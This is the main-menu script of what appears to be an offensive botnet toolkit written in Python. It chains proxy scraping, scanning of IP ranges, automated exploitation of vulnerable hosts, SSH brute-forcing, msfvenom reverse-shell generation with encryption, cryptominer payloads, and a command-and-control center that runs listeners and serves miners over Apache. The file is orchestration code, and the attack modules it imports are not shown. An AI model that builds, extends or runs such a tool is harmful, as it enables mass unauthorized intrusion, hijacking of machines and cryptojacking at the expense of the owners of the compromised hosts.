from globals import (
    global_hosts,
    global_live_hosts,
    global_vulnerable_hosts,
    global_scraped_proxies,
    global_tested_proxies,
    global_active_sessions,
    global_config,
    global_generated_payloads,
    global_error_log,
    global_scan_stats,
    global_wordlist_paths,
    pause_event,
    stop_event,
)
from modules.proxy_handler import load_proxies, test_proxies, scrape_proxies, add_proxy_sources, clear_proxies
from modules.host_handler import load_hosts, load_ip_ranges, test_hosts
from modules.scanner import scan_hosts, show_results, clear_results
from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
from modules.bruteforce import load_wordlists, bruteforce_ssh
from modules.config_handler import configure_settings
from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
import os
import keyboard


def main_menu():
    while True:
        print("\n[ Main Menu ]")
        print("1.) Add Proxy Sources")
        print("2.) Scrape Proxies")
        print("3.) Load Proxies")
        print("4.) Test Proxies")
        print("5.) Clear Proxies")  # NEW OPTION
        print("6.) Load Hosts")
        print("7.) Load IP Ranges")
        print("8.) Test Hosts")
        print("9.) Scan Hosts")
        print("10.) Show Results")
        print("11.) Clear Results")
        print("12.) Identify Vulnerabilities")
        print("13.) Exploit Vulnerable Hosts")
        print("14.) Clear All Chunks")
        print("15.) Split Large CSVs")
        print("16.) SSH Bruteforce")
        print("17.) Configuration Settings")
        print("18.) Generate Reverse Shell")
        print("19.) Manage Cryptominers")
        print("20.) Command and Control Center")
        print("21.) Exit")

        choice = input("Enter your choice: ")
        if choice == "1":
            add_proxy_sources()
        elif choice == "2":
            scrape_proxies()
        elif choice == "3":
            global_scraped_proxies[:] = load_proxies()
        elif choice == "4":
            global_tested_proxies[:] = test_proxies(global_scraped_proxies)
        elif choice == "5":
            clear_proxies()  # NEW FUNCTION CALL
        elif choice == "6":
            global_hosts[:] = load_hosts()
        elif choice == "7":
            global_hosts[:] = load_ip_ranges()
        elif choice == "8":
            global_live_hosts[:] = test_hosts(global_hosts, global_tested_proxies)
        elif choice == "9":
            scan_hosts()
        elif choice == "10":
            show_results()
        elif choice == "11":
            clear_results()
        elif choice == "12":
            global_vulnerable_hosts[:] = identify_vulnerable_hosts(global_live_hosts)
        elif choice == "13":
            exploit_vulnerable_hosts(global_vulnerable_hosts)
        elif choice == "14":
            clear_all_chunks()
        elif choice == "15":
            base_dir = "ip_ranges"
            max_lines = input("Enter the maximum number of lines per chunk (default 200): ")
            try:
                max_lines = int(max_lines) if max_lines else 200
            except ValueError:
                max_lines = 200
            split_large_csvs(base_dir, max_lines)
        elif choice == "16":
            if not global_live_hosts:
                print("[ERROR] No valid live hosts found.")
                continue
            targets = global_live_hosts
            usernames, passwords = load_wordlists()
            if not usernames or not passwords:
                print("[ERROR] Missing or empty wordlists.")
                continue
            bruteforce_ssh(targets, usernames, passwords, max_threads=5)
        elif choice == "17":
            configure_settings()
        elif choice == "18":
            payloads = list_payloads()
            if not payloads:
                continue
            try:
                payload_choice = int(input("Select a payload by number: ")) - 1
                if payload_choice < 0 or payload_choice >= len(payloads):
                    print("[ERROR] Invalid choice.")
                    continue
                payload = payloads[payload_choice]
            except ValueError:
                print("[ERROR] Invalid input.")
                continue
            lhost = input("Enter the LHOST: ").strip()
            lport = input("Enter the LPORT: ").strip()
            output_format = input("Enter the output format (e.g., exe, elf): ").strip()
            output_name = input("Enter the output file name: ").strip()
            shell_path = generate_msfvenom_shell(payload, lhost, lport, output_format, output_name)
            if shell_path:
                encrypt_choice = input("Encrypt the shell? (yes/no): ").strip().lower()
                if encrypt_choice == "yes":
                    encrypt_generated_shell(shell_path)
        elif choice == "19":
            print("\n[ Cryptominer Management ]")
            print("1.) List Cryptominers")
            print("2.) Encrypt All Cryptominers")
            print("3.) Return to Main Menu")
            miner_choice = input("Enter your choice: ")
            if miner_choice == "1":
                list_cryptominers()
            elif miner_choice == "2":
                encrypt_all_cryptominers()
            elif miner_choice == "3":
                continue
        elif choice == "20":
            print("\n[ Command and Control Center ]")
            print("1.) Start Listener")
            print("2.) Command Interface")
            print("3.) Start Apache Server for Cryptominers")
            print("4.) Stop All Listeners")
            print("5.) Return to Main Menu")
            c2_choice = input("Enter your choice: ")
            if c2_choice == "1":
                host = input("Enter listener IP (default 0.0.0.0): ") or "0.0.0.0"
                port = input("Enter listener port (default 4444): ") or "4444"
                try:
                    start_listener(host, int(port))
                except Exception as e:
                    print(f"[ERROR] Failed to start listener: {e}")
            elif c2_choice == "2":
                c2_interface()
            elif c2_choice == "3":
                directory = "payloads/cryptominers"
                port = input("Enter Apache server port (default 80): ") or "80"
                try:
                    start_apache_server(directory, int(port))
                except Exception as e:
                    print(f"[ERROR] Failed to start Apache server: {e}")
            elif c2_choice == "4":
                stop_listeners()
            elif c2_choice == "5":
                continue
            else:
                print("[ERROR] Invalid choice.")
        elif choice == "21":
            print("[INFO] Exiting. Stopping all listeners and background tasks.")
            stop_listeners()
            break

def setup_keyboard_controls():
    """
    Set up F key bindings for pausing and stopping scans.
    """
    def toggle_pause():
        if pause_event.is_set():
            print("[INFO] Resuming...")
            pause_event.clear()
        else:
            print("[INFO] Pausing...")
            pause_event.set()

    def stop_scan():
        print("[INFO] Stopping...")
        stop_event.set()

    # Bind F keys
    keyboard.add_hotkey("F5", toggle_pause)
    keyboard.add_hotkey("F6", stop_scan)

    print("[INFO] Press F5 to pause/resume and F6 to stop scanning.")

setup_keyboard_controls()

if __name__ == "__main__":
    main_menu()
